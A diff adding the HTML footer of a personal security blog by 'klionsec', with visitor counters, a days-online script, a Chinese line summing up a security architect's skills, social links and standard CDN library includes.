+<span id="busuanzi_container_site_pv">博客累计访问量 <span id="busuanzi_value_site_pv"></span> </span>
+<span id="busuanzi_container_site_uv">
+累计访客数 <span id="busuanzi_value_site_uv"></span> 
+</span>
+<span id="showDays"></span>
+<script>
+var birthDay = new Date("12/28/2014");
+var now = new Date();
+var duration = now.getTime() - birthDay.getTime(); 
+var total= Math.floor(duration / (1000 * 60 * 60 * 24));
+document.getElementById("showDays").innerHTML = " 其实,博客已默默独自坚挺了 "+total+" 天";
+</script>
+<br>
+<br>
+多年实战渗透经验积累[大中小型网络] + 娴熟的底层及脚本编写能力 + 熟练的协议分析能力 + 多个大中型安全架构实际设计部署经验 + 良好的逆向分析能力[一定的0day挖掘能力] = 合格安全架构师
+<br>
+<br>
+<br>
+<font size=6 color="white">唯一不变的,就是一直在变</font>
+    <div class="container">
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
+                <ul class="list-inline footer-social-icons">
+                    
+                    <li class="list-inline-item">
+                        <a href="https://github.com/klionsec">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-github"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://twitter.com/klionsec">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-twitter"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://www.facebook.com/klionsec">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-facebook"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="http://www.jianshu.com/u/2a4d8b1f03e0">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-instagram"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://www.zhihu.com/people/klionsec/activities">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-dribbble"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="mailto:klion@protonmail.com">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-envelope-o"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                </ul>
+            </div>
+        </div>
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
+                <div class="footer-copyright">
+                    <strong><font size=4 color=#00FF7F> Blog by klionsec </font></strong>
+                </div>
+            </div>
+        </div>
+    </div>
+<!--
+<audio autoplay="autoplay" width="300" height="200">
+	<source src="/img/Bandari - Childhood Memory.mp3" type="audio/mpeg" />
+</audio>
+-->
+</footer>
+
+
+
+<!-- After footer scripts -->
+
+<!-- jQuery -->
+<script src="//code.jquery.com/jquery-2.1.4.min.js"></script>
+
+<!-- Tween Max -->
+<script src="//cdnjs.cloudflare.com/ajax/libs/gsap/1.18.5/TweenMax.min.js"></script>
+
+<!-- Gallery -->
+<script src="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.js" type="text/javascript" charset="utf-8"></script>
+
+<!-- Custom JavaScript -->
+<script src="/js/main.js"></script>
+
+<!-- Disqus Comments -->
+
+
+
+</body>
+
+</html>
